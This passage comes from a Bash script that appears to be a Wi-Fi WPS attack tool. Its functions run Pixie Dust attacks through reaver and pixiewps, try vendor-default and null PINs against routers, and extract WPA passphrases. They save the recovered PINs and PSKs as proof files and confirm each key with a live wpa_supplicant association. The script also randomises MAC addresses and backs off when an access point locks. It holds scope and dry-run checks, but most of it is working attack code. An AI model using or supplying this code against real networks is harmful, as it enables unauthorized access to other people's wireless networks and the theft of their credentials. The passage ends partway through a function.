	local eht_320mhz="${62:-}" eht_puncturing_supported="${63:-}" eht_mlo_supported="${64:-}" eht_mlo_ap="${65:-}"
	local eht_spatial_streams="${66:-}" eht_mcs_max="${67:-}" eht_raw_capabilities_hex="${68:-}"
	local json out
	json=$(printf '{"sar_version":"%s","report_version":"%s","time":"%s","bssid":"%s","essid":"%s","signal":"%s","channel":"%s","chip":"%s","cves":"%s","wps_ver":"%s","wps_state":"%s","device_password_id":"%s","config_methods":"%s","wps_hidden":"%s","sel_reg":"%s","maker":"%s","model":"%s","device_name":"%s","serial":"%s","firmware":"%s","uuid":"%s","pmf_raw":"%s","pmf_mode":"%s","rsn_caps":"%s","akm_list":"%s","wpa3":"%s","wpa3_tm":"%s","owe_tm":"%s","rsn_gw":"%s","rsn_pw":"%s","rsn_gm":"%s","rsnxe_list":"%s","extcap_list":"%s","tkip":"%s","wpa1":"%s","dpp":"%s","dpp_ver":"%s","dpp_conf":"%s","dpp_pkex":"%s","dpp_vulns":"%s","pin_known":"%s","hidden_pin_candidate":"%s","cfg_methods_no_pin_display":"%s","transition_disable":"%s","td_bitmap":"%s","rsnxe_cap_hex":"%s","wpa3_mode":"%s","pmf_grade":"%s"}' \
		"$(json_escape "$SAR_VERSION")" "$(json_escape "$REPORT_VERSION")" "$(json_escape "$(ts_now)")" \
		"$(json_escape "$bssid")" "$(json_escape "$essid")" "$(json_escape "$signal")" \
		"$(json_escape "$channel")" "$(json_escape "$chip")" "$(json_escape "$cves")" \
		"$(json_escape "$wps_ver")" "$(json_escape "$wps_state")" "$(json_escape "$device_password_id")" \
		"$(json_escape "$config_methods")" "$(json_escape "$wps_hidden")" "$(json_escape "$sel_reg")" \
		"$(json_escape "$maker")" "$(json_escape "$model")" "$(json_escape "$device_name")" \
		"$(json_escape "$serial")" "$(json_escape "$firmware")" "$(json_escape "$uuid")" \
		"$(json_escape "$pmf_raw")" "$(json_escape "$pmf_mode")" "$(json_escape "$rsn_caps")" \
		"$(json_escape "$akm_list")" "$(json_escape "$wpa3")" "$(json_escape "$wpa3_tm")" \
		"$(json_escape "$owe_tm")" "$(json_escape "$rsn_gw")" "$(json_escape "$rsn_pw")" \
		"$(json_escape "$rsn_gm")" "$(json_escape "$rsnxe_list")" "$(json_escape "$extcap_list")" \
		"$(json_escape "$tkip")" "$(json_escape "$wpa1")" \
		"$(json_escape "$dpp")" "$(json_escape "$dpp_ver")" "$(json_escape "$dpp_conf")" \
		"$(json_escape "$dpp_pkex")" "$(json_escape "$dpp_vulns")" \
		"$(json_escape "$pin_known")" "$(json_escape "$hidden_pin_candidate")" \
		"$(json_escape "$cfg_methods_no_pin_display")" \
		"$(json_escape "${transition_disable:-UNKNOWN}")" "$(json_escape "${td_bitmap:-}")" "$(json_escape "${rsnxe_cap_hex:-}")" "$(json_escape "${wpa3_mode:-unknown}")" "$(json_escape "${pmf_grade:-unknown}")") || return 1
	json=$(he_sar_enrich_json "$json" \
		"$he_present" "$he_capabilities_present" "$he_operation_present" \
		"$he_bss_color" "$he_twt_supported" "$he_ul_mu_mimo" "$he_dl_mu_mimo" \
		"$he_ul_ofdma" "$he_dl_ofdma" "$he_160mhz" "$he_80p80" \
		"$he_spatial_streams" "$he_raw_capabilities_hex")
	json=$(eht_sar_enrich_json "$json" \
		"$eht_present" "$eht_capabilities_present" "$eht_operation_present" \
		"$eht_320mhz" "$eht_puncturing_supported" "$eht_mlo_supported" "$eht_mlo_ap" \
		"$eht_spatial_streams" "$eht_mcs_max" "$eht_raw_capabilities_hex")
	json=$(vendor_kb_enrich_sar_json "$bssid" "$json")
	SAR_RECORDS+=("$json")
	if [[ -z "${LOG_DIR:-}" ]]; then
		_ar_engine_dw ar_dual_write_after_scanner
		return 0
	fi
	mkdir -p "$LOG_DIR" 2>/dev/null || {
		_ar_engine_dw ar_dual_write_after_scanner
		return 0
	}
	out="${LOG_DIR}/sar.jsonl"
	printf '%s\n' "$json" >>"$out" 2>/dev/null || true
	chmod 600 "$out" 2>/dev/null || true
	_ar_engine_dw ar_dual_write_after_scanner
	return 0
}

function sar_store_locked_stub() {
	local bssid="$1" essid="$2" signal="$3" channel="$4" chip="${5:-unknown}"
	local wps_ver="${6:-}" wps_state="${7:-}" skip_reason="${8:-locked_for_now}"
	local json out
	case "${ENABLE_LOCKED_SAR_STUB:-1}" in
	1 | yes | YES | on | ON | true | TRUE) ;;
	*) return 0 ;;
	esac
	[[ -n "$bssid" ]] || return 1
	[[ -n "$essid" ]] || essid="<hidden>"
	[[ -n "$signal" ]] || signal="0"
	case "$channel" in '' | *[!0-9]*) channel=1 ;; esac
	[[ -n "$chip" ]] || chip="unknown"
	json=$(printf '{"sar_version":"%s","report_version":"%s","time":"%s","bssid":"%s","essid":"%s","signal":"%s","channel":"%s","chip":"%s","cves":"","wps_ver":"%s","wps_state":"%s","device_password_id":"unknown","config_methods":"0x0000","wps_hidden":"NO","sel_reg":"NO","maker":"","model":"","device_name":"","serial":"","firmware":"","uuid":"","pmf_raw":"NO","pmf_mode":"?","rsn_caps":"NO","akm_list":"","wpa3":"NO","wpa3_tm":"0","owe_tm":"NO","rsn_gw":"","rsn_pw":"","rsn_gm":"","rsnxe_list":"","extcap_list":"","tkip":"NO","wpa1":"NO","dpp":"NO","dpp_ver":"unknown","dpp_conf":"NO","dpp_pkex":"NO","dpp_vulns":"","pin_known":"0","hidden_pin_candidate":"0","cfg_methods_no_pin_display":"0","transition_disable":"UNKNOWN","td_bitmap":"","rsnxe_cap_hex":"","wpa3_mode":"unknown","pmf_grade":"unknown","ap_locked":"YES","assessment_mode":"inventory","skip_validation":"YES","skip_reason":"%s"}' \
		"$(json_escape "$SAR_VERSION")" "$(json_escape "$REPORT_VERSION")" "$(json_escape "$(ts_now)")" \
		"$(json_escape "$bssid")" "$(json_escape "$essid")" "$(json_escape "$signal")" \
		"$(json_escape "$channel")" "$(json_escape "$chip")" \
		"$(json_escape "${wps_ver:-}")" "$(json_escape "${wps_state:-}")" \
		"$(json_escape "$skip_reason")") || return 1
	SAR_RECORDS+=("$json")
	if [[ -n "${LOG_DIR:-}" ]] && mkdir -p "$LOG_DIR" 2>/dev/null; then
		out="${LOG_DIR}/sar.jsonl"
		printf '%s\n' "$json" >>"$out" 2>/dev/null || true
		chmod 600 "$out" 2>/dev/null || true
	fi
	_ar_engine_dw ar_dual_write_after_scanner
	return 0
}

function save_registrar() {
	local b="$1" e="$2" chip="$3" ver="$4"
	local man="${5:-}" model="${6:-}" dev="${7:-}" ser="${8:-}" fw="${9:-}" uuid="${10:-}"
	if [[ -z "$man" && -z "$model" ]]; then return 0; fi
	if [[ -z "${LOG_DIR:-}" ]]; then return 1; fi
	mkdir -p "$LOG_DIR" 2>/dev/null || return 1
	local out
	out="${LOG_DIR}/device_${b//:/}_$(date +%s).json"
	printf '{"bssid":"%s","essid":"%s","maker":"%s","model":"%s","device_name":"%s","serial":"%s","firmware":"%s","uuid":"%s","wps_version":"%s","chipset":"%s","time":"%s"}\n' \
		"$(json_escape "$b")" "$(json_escape "$e")" "$(json_escape "${man:-unknown}")" \
		"$(json_escape "${model:-unknown}")" "$(json_escape "${dev:-unknown}")" \
		"$(json_escape "${ser:-unknown}")" "$(json_escape "${fw:-unknown}")" \
		"$(json_escape "${uuid:-unknown}")" "$(json_escape "$ver")" \
		"$(json_escape "$chip")" "$(json_escape "$(ts_now)")" >"$out" || return 1
	chmod 600 "$out" 2>/dev/null || true
	print_log INFO OSINT "Saved device: ${out##*/}"
}

function verify_psk_live() {
	local b="$1" essid="$2" psk="$3"
	[[ "${ENABLE_LIVE_VERIFY:-1}" == "1" ]] || return 2
	[[ "${ENABLE_DRY_RUN:-0}" == "1" ]] && return 2
	[[ -n "$essid" && "$essid" != "<hidden>" && -n "$psk" ]] || return 2
	[[ "$psk" != "unknown" && "$psk" != "<empty>" ]] || return 2
	[[ "${#psk}" -ge 8 && "${#psk}" -le 63 ]] || return 2
	command -v wpa_supplicant &>/dev/null || return 2
	active_attack_permitted "$b" || return 2
	ensure_mode "managed" 2>/dev/null || return 2

	local ctrl conf log pid secs=0 maxs ok=1
	maxs="${LIVE_VERIFY_SECS:-15}"
	[[ "$maxs" =~ ^[0-9]+$ ]] && ((maxs > 0)) || maxs=15
	ctrl=$(mktemp -d "${TMP_DIR:-/tmp}/lv_XXXXXX") || return 2
	conf="${ctrl}/wpa.conf"
	log="${ctrl}/wpa.log"
	if command -v wpa_passphrase &>/dev/null; then
		{ printf 'ctrl_interface=%s\n' "$ctrl"; wpa_passphrase "$essid" "$psk" 2>/dev/null; } >"$conf" 2>/dev/null || true
	else
		{
			printf 'ctrl_interface=%s\n' "$ctrl"
			printf 'network={\n\tssid="%s"\n\tscan_ssid=1\n\tpsk="%s"\n\tkey_mgmt=WPA-PSK\n}\n' "$essid" "$psk"
		} >"$conf" 2>/dev/null || true
	fi
	if [[ ! -s "$conf" ]]; then rm -rf "$ctrl" 2>/dev/null || true; return 2; fi
	: >"$log"
	timeout --kill-after=3 -- "$maxs" wpa_supplicant -i "$IFACE" -c "$conf" >"$log" 2>&1 &
	pid=$!
	while ((secs < maxs)); do
		if grep -qE 'CTRL-EVENT-CONNECTED|WPA: Key negotiation completed' "$log" 2>/dev/null; then ok=0; break; fi
		if grep -qE '4-Way Handshake failed|pre-shared key may be incorrect|WRONG_KEY|CTRL-EVENT-SSID-TEMP-DISABLED' "$log" 2>/dev/null; then ok=1; break; fi
		sleep 1
		secs=$((secs + 1))
	done
	kill "$pid" 2>/dev/null || true
	wait "$pid" 2>/dev/null || true
	rm -rf "$ctrl" 2>/dev/null || true
	ensure_mode "managed" 2>/dev/null || true
	return "$ok"
}

function save_proof() {
	local b="$1" chip="$2" pin="$3" psk="$4" meth="$5"
	if [[ ! -d "$LOG_DIR" ]]; then mkdir -p "$LOG_DIR" 2>/dev/null || return 1; fi
	local name
	name="proof_${b//:/}_$(date +%s)_$$.conf"
	local path="${HASH_DIR:-$LOG_DIR}/${name}"
	local h
	h=$(printf '%s' "$psk" | sha256sum 2>/dev/null | awk '{print $1}')
	{
		printf '# time: %s\n' "$(ts_now)"
		printf '# bssid: %s\n' "$b"
		printf '# essid: %s\n' "${CUR_ESSID:-unknown}"
		printf '# chip: %s\n' "${chip:-unknown}"
		printf '# method: %s\n' "${meth:-unknown}"
		printf '# pin: %s\n' "${pin:-<empty>}"
		printf '# psk: %s\n' "${psk:-unknown}"
		printf '# psk_sha: %s\n' "${h:-none}"
	} >"$path"
	chmod 600 "$path" 2>/dev/null || true
	print_log OK PROOF "Saved: $name"
	log_attempt "$b" "$meth" "SUCCESS" "pin=${pin:-<empty>} psk_sha=$h"
	mark_known "$b" "SUCCESS:${meth}"
	CREDS_FOUND+=("$b|${CUR_ESSID:-}|$meth|${pin:-}|${psk:-}")
	if [[ "${REVEAL_CREDS:-0}" == "1" ]]; then
		print_log VULN CREDS "$b ${CUR_ESSID:-hidden} PIN=${pin:-<empty>} PSK=${psk:-<unknown>} via $meth"
	fi

	if [[ "${ENABLE_LIVE_VERIFY:-1}" == "1" ]]; then
		if [[ "$meth" == "wpa_brute" ]]; then
			printf '# live_verified: yes (online association during wpa_brute)\n' >>"$path" 2>/dev/null || true
			log_attempt "$b" "$meth" "LIVE_VERIFY" "yes (online association during attack)"
		else
			local _lv_rc=2
			verify_psk_live "$b" "${CUR_ESSID:-}" "$psk" && _lv_rc=0 || _lv_rc=$?
			case "$_lv_rc" in
			0)
				printf '# live_verified: yes (one-shot wpa_supplicant association)\n' >>"$path" 2>/dev/null || true
				print_log VULN LIVEVERIFY "$b live verified"
				log_attempt "$b" "$meth" "LIVE_VERIFY" "yes (live association succeeded)"
				;;
			1)
				log_attempt "$b" "$meth" "LIVE_VERIFY" "no (offline proof stands)"
				;;
			*) : ;; # skipped (disabled / dry-run / hidden essid / no tool / out of scope): no marker
			esac
		fi
	fi
}

function extract_wps_hex() {
	grep -m1 "WPS: $1 - hexdump" "$2" 2>/dev/null |
		sed 's/.*hexdump(len=[0-9]*):[[:space:]]*//' | tr -d '\n' | tr '[:lower:]' '[:upper:]'
}

function validate_wps_params() {
	local -A expected=(["E-Nonce"]=32 ["PKR"]=384 ["PKE"]=384 ["AuthKey"]=64 ["E-Hash1"]=64 ["E-Hash2"]=64)
	local -A values=(["E-Nonce"]="$1" ["PKR"]="$2" ["PKE"]="$3" ["AuthKey"]="$4" ["E-Hash1"]="$5" ["E-Hash2"]="$6")
	local name val exp
	for name in "E-Nonce" "PKR" "PKE" "AuthKey" "E-Hash1" "E-Hash2"; do
		val="${values[$name]}"
		exp="${expected[$name]}"
		if [[ -z "$val" ]]; then
			print_log ERROR PIXIE "$name empty"
			return 1
		fi
		if [[ ! "$val" =~ ^[0-9a-fA-F]+$ ]]; then
			print_log ERROR PIXIE "$name not hex"
			return 1
		fi
		if [[ ${#val} -ne $exp ]]; then
			print_log ERROR PIXIE "$name len ${#val} != $exp"
			return 1
		fi
	done
	return 0
}

: "${REAVER_TURBO_WIN7:=1}"
: "${REAVER_TURBO_DH_SMALL:=0}"
: "${REAVER_TURBO_NO_NACKS:=1}"
: "${REAVER_TURBO_IGNORE_LOCKS:=0}"
: "${REAVER_TURBO_M57_TIMEOUT:=1}"
: "${REAVER_TURBO_DELAY:=2}"
: "${REAVER_PIXIE_K_ARG:=}"

_REAVER_HELP_CACHE_UNSET=1

_reaver_init_help_cache() {
	if [[ "${_REAVER_HELP_CACHE_UNSET:-1}" == "1" ]]; then
		_REAVER_HELP_CACHE_UNSET=0
		if command -v reaver >/dev/null 2>&1; then
			_REAVER_HELP_CACHE="$(reaver -h 2>&1 || true)"
		else
			_REAVER_HELP_CACHE=""
		fi
	fi
}

_reaver_has_opt() {
	_reaver_init_help_cache
	[[ "${_REAVER_HELP_CACHE:-}" == *"--$1"* ]]
}

function attack_pixie() {
	local b="$1"
	local chip="$2"
	local ver="${3:-}"
	local pin="${4:-}"
	local chip_family="${5:-}"
	print_log INFO WPS-PIXIE "Pixie attack $b ($chip/${chip_family:-n/a})"
	log_attempt "$b" "pixie" "START" "chip=$chip family=${chip_family:-n/a} ver=$ver"

	if [[ ! "$b" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
		print_log ERROR PIXIE "Bad BSSID: $b"
		log_attempt "$b" "pixie" "FAIL" "invalid BSSID"
		return 1
	fi

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		print_log WARN PIXIE "Dry run"
		log_attempt "$b" "pixie" "SKIP" "dry-run"
		return 1
	fi

	if [[ ! "${PIXIE_TIMEOUT:-20}" =~ ^[0-9]+$ ]]; then PIXIE_TIMEOUT=20; fi

	local flog="" psk="" pc="" st=""
	local ctrl_dir="" _wps_pid="" _cli_pid=""
	local got=0 end=0
	local enonce="" pkr="" pke="" auth="" h1="" h2="" out=""
	local -a args=() mode_args=() reaver_args=()
	local reaver_rc=0

	if command -v reaver >/dev/null 2>&1; then
		_reaver_init_help_cache
		if _reaver_has_opt pixie-dust && ensure_mode "monitor"; then
			iface_set_channel "${CUR_CHANNEL:-1}" 2>/dev/null || true
			flog="${TMP_DIR}/pixie_${b//:/}_$(date +%s).log"
			: >"$flog"
			local pixie_to=$((10#${PIXIE_TIMEOUT:-20} + 5))
			reaver_args=(-i "$IFACE" -b "$b" -c "${CUR_CHANNEL:-1}")
			if [[ -n "${REAVER_PIXIE_K_ARG:-}" ]]; then
				reaver_args+=(-K "$REAVER_PIXIE_K_ARG")
			else
				reaver_args+=(-K)
			fi
			if _reaver_has_opt win7 && [[ "${REAVER_TURBO_WIN7:-1}" == "1" ]]; then reaver_args+=(-w); fi
			if _reaver_has_opt dh-small && [[ "${REAVER_TURBO_DH_SMALL:-0}" == "1" ]]; then reaver_args+=(-S); fi
			if _reaver_has_opt no-nacks && [[ "${REAVER_TURBO_NO_NACKS:-1}" == "1" ]]; then reaver_args+=(-N); fi
			if _reaver_has_opt m57-timeout && [[ -n "${REAVER_TURBO_M57_TIMEOUT:-}" ]]; then
				reaver_args+=(-T "${REAVER_TURBO_M57_TIMEOUT:-1}")
			fi
			reaver_args+=(-d "${REAVER_TURBO_DELAY:-2}" -vv)

			timeout --kill-after=5 -- "$pixie_to" \
				reaver "${reaver_args[@]}" </dev/null >"$flog" 2>&1 || reaver_rc=$?

			case "$reaver_rc" in
			0) : ;;
			124) print_log WARN PIXIE "Reaver timeout ${pixie_to}s" ;;
			1) print_log WARN PIXIE "Reaver: no PIN" ;;
			*) print_log WARN PIXIE "Reaver exit ${reaver_rc}" ;;
			esac

			pin=$(grep -oE "WPS PIN: '?[0-9]{8}'?" "$flog" 2>/dev/null | grep -oE '[0-9]{8}' | tail -1)
			ensure_mode "managed" 2>/dev/null || true

			if [[ -n "$pin" ]] && pin_check "$pin"; then
				pc=$(pin_entropy_class "$pin")
				if [[ "$pc" == "trivial" || "$pc" == "weak" ]]; then
					print_log VULN WEAKPIN "$b weak PIN $pin ($pc)"
				fi
				print_log VULN HACKED "Got PIN."
				psk=$(grep -iE 'WPA PSK:' "$flog" 2>/dev/null | head -1 | sed -E "s/.*WPA PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")
				save_proof "$b" "$chip" "$pin" "${psk:-unknown}" "pixie"
				HITS=$((HITS + 1))
				mark_known "$b" "PIXIE_SUCCESS:$pin"
				return 0
			fi

			st=$(lock_state "$flog")
			if [[ "$st" != "none" ]]; then
				do_backoff "$b" "$st"
				log_attempt "$b" "pixie" "FAIL" "reaver -K lockout ($st)"
				return 1
			fi

			if [[ $reaver_rc -eq 1 ]]; then
				print_log WARN PIXIE "WPS off"
				log_attempt "$b" "pixie" "FAIL" "rc=1, WPS not responding or patched"
			else
				print_log WARN PIXIE "No PIN"
				log_attempt "$b" "pixie" "FAIL" "no PIN (rc=${reaver_rc})"
			fi
		else
			print_log WARN PIXIE "Try managed"
		fi
	fi

	if ! ensure_mode "managed"; then return 1; fi

	ctrl_dir=$(mktemp -d "${TMP_DIR:-/tmp}/wps_ctrl_XXXXXX") || {
		print_log ERROR PIXIE "Temp failed"
		return 1
	}

	cat >"$WPS_CONF" <<EOF
ctrl_interface=$ctrl_dir
ctrl_interface_group=$(id -g)
update_config=1
$(stealth_wps_id_block)
preassoc_mac_addr=1
mac_addr=1
rand_addr_lifetime=60
country=${REG_DOMAIN:-PL}
EOF

	: >"$WPS_LOG"
	stdbuf -oL -eL wpa_supplicant -i "$IFACE" -d -K -c "$WPS_CONF" >"$WPS_LOG" 2>&1 &
	_wps_pid=$!
	BG_PIDS+=("$_wps_pid")

	if ! wait_socket "$ctrl_dir/$IFACE" 5; then
		print_log ERROR PIXIE "No socket"
		kill -9 "$_wps_pid" 2>/dev/null
		wait "$_wps_pid" 2>/dev/null || true
		rm -rf "$ctrl_dir"
		return 1
	fi

	timeout 20 wpa_cli -i "$IFACE" -p "$ctrl_dir" wps_reg "$b" "$DEFAULT_WPS_PIN" >/dev/null 2>&1 &
	_cli_pid=$!
	BG_PIDS+=("$_cli_pid")

	got=0
	end=$(($(date +%s) + PIXIE_TIMEOUT))
	while [[ $(date +%s) -lt $end ]]; do
		if grep -q "WPS: Received M2" "$WPS_LOG" 2>/dev/null; then
			got=1
			break
		elif grep -q "WPS: Received M2D" "$WPS_LOG" 2>/dev/null; then
			print_log WARN PIXIE "AP refused"
			log_attempt "$b" "pixie" "FAIL" "M2D received"
			break
		fi
		sleep 0.3
	done

	kill -TERM "$_cli_pid" 2>/dev/null
	wait "$_cli_pid" 2>/dev/null || true
	kill -TERM "$_wps_pid" 2>/dev/null
	wait "$_wps_pid" 2>/dev/null || true
	if kill -0 "$_wps_pid" 2>/dev/null; then
		kill -9 "$_wps_pid" 2>/dev/null || true
		wait "$_wps_pid" 2>/dev/null || true
	fi

	rm -rf "$ctrl_dir"
	sleep 0.3

	st=$(lock_state "$WPS_LOG")
	if [[ "$st" != "none" ]]; then
		do_backoff "$b" "$st"
		return 1
	fi

	if [[ $got -eq 0 ]]; then
		print_log WARN PIXIE "No reply."
		log_attempt "$b" "pixie" "FAIL" "no M2"
		return 1
	fi

	enonce=$(extract_wps_hex "Enrollee Nonce" "$WPS_LOG" | tr -d ' ')
	pkr=$(extract_wps_hex "DH own Public Key" "$WPS_LOG" | tr -d ' ')
	pke=$(extract_wps_hex "DH peer Public Key" "$WPS_LOG" | tr -d ' ')
	auth=$(extract_wps_hex "AuthKey" "$WPS_LOG" | tr -d ' ')
	h1=$(extract_wps_hex "E-Hash1" "$WPS_LOG" | tr -d ' ')
	h2=$(extract_wps_hex "E-Hash2" "$WPS_LOG" | tr -d ' ')

	if ! validate_wps_params "$enonce" "$pkr" "$pke" "$auth" "$h1" "$h2"; then
		log_attempt "$b" "pixie" "FAIL" "bad hex data"
		return 1
	fi

	args=()
	local _mode_str="${CHIPSET_PIXIE_MODES[$chip]:-}"
	if [[ -n "$_mode_str" ]]; then
		print_log INFO PIXIE "Mode ($chip): $_mode_str"
	fi
	if [[ -z "$_mode_str" && -n "$chip_family" ]]; then
		_mode_str="${CHIPSET_PIXIE_MODES[$chip_family]:-}"
		if [[ -n "$_mode_str" ]]; then
			print_log INFO PIXIE "Mode ($chip_family): $_mode_str"
		fi
	fi
	if [[ -z "$_mode_str" && -n "${PIXIEWPS_FALLBACK_MODE:-}" ]]; then
		_mode_str="--mode ${PIXIEWPS_FALLBACK_MODE}"
		print_log INFO PIXIE "Mode (fallback): $_mode_str"
	fi
	if [[ -z "$_mode_str" ]]; then
		_mode_str="--mode 1,2,3,4,5"
		print_log WARN PIXIE "Try modes"
	fi

	if [[ -n "$_mode_str" ]]; then
		mode_args=()
		read -r -a mode_args <<<"$_mode_str"
		if [[ "${mode_args[0]:-}" == "--mode" && "${mode_args[1]:-}" =~ ^[1-5](,[1-5])*$ ]]; then
			args+=("${mode_args[@]}")
		else
			print_log WARN PIXIE "Bad mode"
		fi
	fi

	if [[ "${ENABLE_MULTITHREADING:-0}" == "1" ]]; then
		local cores
		cores=${MAX_CORES:-$(nproc 2>/dev/null || echo 1)}
		if ((cores > 8)); then cores=8; fi
		args+=(--jobs "$cores")
	fi

	args+=(
		--e-nonce "$enonce"
		--pke "$pke"
		--pkr "$pkr"
		--authkey "$auth"
		--e-hash1 "$h1"
		--e-hash2 "$h2"
	)

	print_log INFO PIXIE "Run pixiewps"
	local pixie_rc=0
	out=$(timeout --kill-after=3 -- "$((PIXIE_TIMEOUT + 10))" \
		pixiewps "${args[@]}" </dev/null 2>&1) || pixie_rc=$?

	if [[ $pixie_rc -ne 0 ]]; then
		print_log WARN PIXIE "pixiewps failed ($pixie_rc)"
		log_attempt "$b" "pixie" "FAIL" "pixiewps exit=$pixie_rc"
		return 1
	fi

	pin=$(printf '%s\n' "$out" | grep -iE '(WPS )?pin:' | head -n1 | grep -oE '[0-9]{8}' | tail -1)
	if [[ -z "$pin" ]] || ! pin_check "$pin"; then
		print_log WARN PIXIE "Bad PIN: ${pin:-empty}"
		log_attempt "$b" "pixie" "FAIL" "invalid pin from pixiewps"
		return 1
	fi

	psk=$(printf '%s\n' "$out" | grep -iE 'WPA-?PSK:' | head -1 |
		sed -E "s/.*WPA-?PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")

	pc=$(pin_entropy_class "$pin")
	if [[ "$pc" == "trivial" || "$pc" == "weak" ]]; then
		print_log VULN WEAKPIN "$b weak PIN $pin ($pc)"
	fi
	print_log VULN HACKED "Got PIN."
	save_proof "$b" "$chip" "$pin" "${psk:-unknown}" "pixie"
	HITS=$((HITS + 1))
	mark_known "$b" "PIXIE_SUCCESS:$pin"
	return 0
}

function attack_vendor() {
	local b="$1" chip="$2" ok=0
	print_log INFO WPS-PIN "Vendor PINs $b"
	log_attempt "$b" "vendor" "START" "chip=$chip"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "vendor" "SKIP" "dry-run"
		return 1
	fi
	if ! command -v reaver &>/dev/null; then
		log_attempt "$b" "vendor" "FAIL" "no reaver"
		return 1
	fi

	local -a pins=("$DEFAULT_WPS_PIN")
	append_pins_from_mac_sources pins "$b"

	local oui="" vendor=""
	oui=$(normalize_oui "$b")
	vendor=$(get_vendor "$b")
	case "$vendor" in
	tp-link | d-link) pins+=("20172527" "88776655") ;;
	ubiquiti) pins+=("01234567") ;;
	esac

	local uniq_pins="" candidate=""
	while IFS= read -r candidate; do
		if [[ -z "$candidate" ]]; then continue; fi
		if [[ ! "$candidate" =~ ^[0-9]{8}$ ]]; then continue; fi
		if pin_check "$candidate"; then
			uniq_pins+="${candidate}"$'\n'
		else
			print_log WARN VENDOR "Skip $candidate"
		fi
	done < <(printf '%s\n' "${pins[@]}" | sort -u)

	local pin_count=0
	if [[ -n "$uniq_pins" ]]; then
		pin_count=$(printf '%s\n' "$uniq_pins" | grep -c '^[0-9]\{8\}$') || pin_count=0
	fi

	print_log INFO WPS-PIN "Try $pin_count PINs"
	if [[ $pin_count -eq 0 ]]; then
		log_attempt "$b" "vendor" "FAIL" "no valid candidates"
		return 1
	fi

	if ! ensure_mode "monitor"; then
		log_attempt "$b" "vendor" "FAIL" "mode switch error"
		return 1
	fi

	local vendor_dir
	vendor_dir=$(mktemp -d "${TMP_DIR:-/tmp}/vendor_XXXXXX") || {
		ensure_mode "managed" 2>/dev/null || true
		return 1
	}
	trap 'ensure_mode "managed" 2>/dev/null || true; rm -rf "$vendor_dir" 2>/dev/null || true' INT TERM

	iface_set_channel "$CUR_CHANNEL" 2>/dev/null || true
	sleep 0.5

	local p="" attempt_num=0 flog="" psk="" pc="" st=""
	while IFS= read -r p; do
		if [[ -z "$p" || ! "$p" =~ ^[0-9]{8}$ ]]; then continue; fi
		attempt_num=$((attempt_num + 1))
		print_log INFO WPS-PIN "[$attempt_num/$pin_count] try $p"
		flog="${vendor_dir}/vendor_${b//:/}_${p}.log"
		: >"$flog"

		timeout -k 5 20 reaver -i "$IFACE" -b "$b" -c "$CUR_CHANNEL" -p "$p" -N -F -w -d 3 -T 5 -vv >"$flog" 2>&1 || true

		if grep -qE '\[\+\] WPS PIN:' "$flog" 2>/dev/null || grep -qiE 'WPA PSK:' "$flog" 2>/dev/null; then
			psk=$(grep -iE 'WPA PSK:' "$flog" 2>/dev/null | head -n1 | sed -E "s/.*WPA PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")
			pc=$(pin_entropy_class "$p")
			if [[ "$pc" == "trivial" || "$pc" == "weak" ]]; then print_log VULN WEAKPIN "$b weak PIN $p ($pc)"; fi
			print_log VULN HACKED "Got PIN."
			save_proof "$b" "$chip" "$p" "${psk:-unknown}" "vendor"
			HITS=$((HITS + 1))
			ok=1
			mark_known "$b" "VENDOR_PIN_SUCCESS:$p"
			break
		fi

		st=$(lock_state "$flog")
		case "$st" in
		hard | crash)
			do_backoff "$b" "$st"
			log_attempt "$b" "vendor" "LOCKED" "pin=$p lock=$st"
			break
			;;
		soft)
			do_backoff "$b" "$st"
			log_attempt "$b" "vendor" "SOFT_LOCK" "pin=$p"
			continue
			;;
		none) log_attempt "$b" "vendor" "REJECTED" "pin=$p" ;;
		esac

		sleep "${COOLDOWN:-5}"
	done <<<"$uniq_pins"

	ensure_mode "managed" 2>/dev/null || true
	trap - INT TERM
	rm -rf "$vendor_dir" 2>/dev/null || true

	if [[ $ok -eq 0 ]]; then log_attempt "$b" "vendor" "FAIL" "No vendor pin matched ($attempt_num tried)"; fi
	return $((ok ? 0 : 1))
}

function attack_null() {
	local b="$1" chip="$2" ok=0
	print_log INFO NULL "Try PIN null $b"
	log_attempt "$b" "null" "START" "pin=00000000"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "null" "SKIP" "dry-run"
		return 1
	fi
	if ! command -v reaver &>/dev/null; then
		log_attempt "$b" "null" "FAIL" "no reaver"
		return 1
	fi
	if ! ensure_mode "monitor"; then
		log_attempt "$b" "null" "FAIL" "mode switch error"
		return 1
	fi

	local null_dir
	null_dir=$(mktemp -d "${TMP_DIR:-/tmp}/null_XXXXXX") || {
		ensure_mode "managed" 2>/dev/null || true
		return 1
	}
	trap 'ensure_mode "managed" 2>/dev/null || true; rm -rf "$null_dir" 2>/dev/null || true' INT TERM RETURN

	iface_set_channel "$CUR_CHANNEL" 2>/dev/null || true
	sleep 0.5
	local flog="${null_dir}/null_${b//:/}.log"
	: >"$flog"

	timeout -k 5 20 reaver -i "$IFACE" -b "$b" -c "$CUR_CHANNEL" -p "$ZERO_WPS_PIN" -F -w -L -N -T 5 -vv >"$flog" 2>&1 || true

	if grep -qE "WPS PIN:.*'?00000000'?" "$flog" 2>/dev/null && grep -qi "WPA PSK:" "$flog" 2>/dev/null; then
		local psk=""
		psk=$(grep -i "WPA PSK:" "$flog" 2>/dev/null | head -n1 | sed -E "s/.*WPA PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")
		print_log VULN HACKED "Got PIN."
		save_proof "$b" "$chip" "$ZERO_WPS_PIN" "${psk:-unknown}" "null"
		HITS=$((HITS + 1))
		ok=1
	else
		if grep -qE 'WPS locked|Lock timeout|reported WPS is locked' "$flog" 2>/dev/null; then
			do_backoff "$b" "hard"
			log_attempt "$b" "null" "FAIL" "WPS Lock"
		else
			log_attempt "$b" "null" "FAIL" "Zero PIN rejected"
		fi
	fi

	ensure_mode "managed" 2>/dev/null || true
	trap - INT TERM RETURN
	rm -rf "$null_dir" 2>/dev/null || true
	return $((ok ? 0 : 1))
}

function attack_empty() {
	local b="$1" chip="$2" ok=0
	print_log INFO EMPTY "Try PIN empty $b"
	log_attempt "$b" "empty" "START" "pin=<empty>"

